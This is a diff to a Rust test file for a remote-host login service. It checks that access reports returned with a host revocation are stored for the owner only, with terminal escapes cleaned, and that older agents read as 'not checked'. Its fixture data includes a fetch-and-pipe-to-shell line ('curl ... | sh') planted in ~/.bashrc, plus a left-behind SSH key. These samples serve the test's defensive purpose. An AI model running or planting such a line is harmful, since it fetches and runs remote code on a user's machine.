@@ -185,10 +185,10 @@ async fn authorized_host_revocation_retains_cleanup_after_authority_retirement()
     eprintln!("login_cleanup pending_after_retirement=true durable_reconnect_confirmed=true");
 }
 
-/// D356: the access files a host reports with its revocation reach the owner
-/// through the cleanup outbox. The report is kept with the receipt that
-/// confirms the revocation, cleaned of terminal escapes, readable by the
-/// host's owner only, and pending until the host confirms.
+/// D356: the access report a host returns with its revocation reaches the
+/// owner through the cleanup outbox. It is kept with the receipt that
+/// confirms the revocation, cleaned of terminal escapes, with D353's warning,
+/// readable by the host's owner only, and pending until the host confirms.
 #[tokio::test]
 async fn a_revocation_report_is_kept_with_its_receipt_for_the_owner() {
     let fixture = login_host(None).await;
@@ -200,14 +200,17 @@ async fn a_revocation_report_is_kept_with_its_receipt_for_the_owner() {
             .unwrap(),
         Some(crate::access_report::Reading::Pending)
     );
-    let changed = serde_json::json!({"files":[
-        {"path":"~/.ssh/authorized_keys","lines":["ssh-ed25519 AAAAleft left-behind"]},
-        {"path":"~/.bashrc","lines":["curl -s http://example.invalid/x | sh\u{1b}[2J"]},
-        {"path":"~/.profile","lines":[],"note":"a symbolic link; not followed"}
-    ],"truncated":false});
-    reconnect_cleanup_reporting(&fixture, Some(true), Some(changed)).await;
+    let extra = serde_json::json!({
+        "warning": "Background programs of this host account may still be running.",
+        "access": {"state":"changed","accounts":[{"account":"deploy","state":"changed","files":[
+            {"path":"~/.ssh/authorized_keys","change":"changed","lines":["ssh-ed25519 AAAAleft left-behind"]},
+            {"path":"~/.bashrc","change":"changed","lines":["curl -s http://example.invalid/x | sh\u{1b}[2J"]},
+            {"path":"~/.profile","change":"added","lines":[],"note":"a symbolic link to /etc/passwd; not followed"}
+        ],"truncated":false,"unscanned":[],"omitted_files":0}]}
+    });
+    reconnect_cleanup_reporting(&fixture, Some(true), Some(extra)).await;
     retirement.await.unwrap().unwrap();
-    let Some(crate::access_report::Reading::Ready(reports)) =
+    let Some(crate::access_report::Reading::Reported(reports)) =
         crate::access_report::read(&fixture.pool, &owner, fixture.host)
             .await
             .unwrap()
@@ -217,11 +220,19 @@ async fn a_revocation_report_is_kept_with_its_receipt_for_the_owner() {
     assert_eq!(reports.len(), 1);
     let (person, report) = &reports[0];
     assert_eq!(*person, fixture.person);
-    let paths: Vec<&str> = report.files.iter().map(|file| file.path.as_str()).collect();
+    assert_eq!(report.state, crate::access_report::State::Changed);
+    assert!(report.warning.is_some(), "D353's warning was dropped");
+    let account = &report.accounts[0];
+    assert_eq!(account.account, "deploy");
+    let paths: Vec<&str> = account
+        .files
+        .iter()
+        .map(|file| file.path.as_str())
+        .collect();
     assert_eq!(paths, ["~/.ssh/authorized_keys", "~/.bashrc", "~/.profile"]);
-    assert_eq!(report.files[0].lines, ["ssh-ed25519 AAAAleft left-behind"]);
+    assert_eq!(account.files[0].lines, ["ssh-ed25519 AAAAleft left-behind"]);
     assert_eq!(
-        report.files[1].lines,
+        account.files[1].lines,
         ["curl -s http://example.invalid/x | sh\u{fffd}[2J"]
     );
     assert_eq!(
@@ -230,6 +241,28 @@ async fn a_revocation_report_is_kept_with_its_receipt_for_the_owner() {
             .unwrap(),
         None,
         "another account read this host's report"
+    );
+}
+
+/// J322 P2: an agent older than D356 confirms with no report. The owner
+/// reads "not checked: older agent", never "nothing changed".
+#[tokio::test]
+async fn an_older_agents_revocation_reads_not_checked() {
+    let fixture = login_host(None).await;
+    let retirement = pending_retirement(&fixture).await;
+    reconnect_cleanup(&fixture, Some(true)).await;
+    retirement.await.unwrap().unwrap();
+    let Some(crate::access_report::Reading::Reported(reports)) =
+        crate::access_report::read(&fixture.pool, &fixture.person.to_string(), fixture.host)
+            .await
+            .unwrap()
+    else {
+        panic!("the confirmed revocation has no report");
+    };
+    assert_eq!(reports[0].1.state, crate::access_report::State::NotChecked);
+    assert_eq!(
+        reports[0].1.reason,
+        Some(crate::access_report::Reason::OlderAgent)
     );
 }
 
@@ -340,12 +373,12 @@ async fn reconnect_cleanup(fixture: &LoginHost, durable: Option<bool>) {
     reconnect_cleanup_reporting(fixture, durable, None).await;
 }
 
-/// [`reconnect_cleanup`] whose durable reply also carries D356's `changed`
-/// report, as a host returns it.
+/// [`reconnect_cleanup`] whose durable reply also carries the fields of
+/// `extra` (D356's `access` report, D353's `warning`), as a host returns them.
 async fn reconnect_cleanup_reporting(
     fixture: &LoginHost,
     durable: Option<bool>,
-    changed: Option<serde_json::Value>,
+    extra: Option<serde_json::Value>,
 ) {
     let connection = remote_tls::dial(
         fixture.listeners.local_addr().unwrap(),
@@ -393,8 +426,10 @@ async fn reconnect_cleanup_reporting(
             return;
         };
         let mut reply = serde_json::json!({"revoked": durable});
-        if let Some(changed) = &changed {
-            reply["changed"] = changed.clone();
+        if let Some(serde_json::Value::Object(fields)) = &extra {
+            for (name, value) in fields {
+                reply[name] = value.clone();
+            }
         }
         let json = reply.to_string();
         Transmit::default()
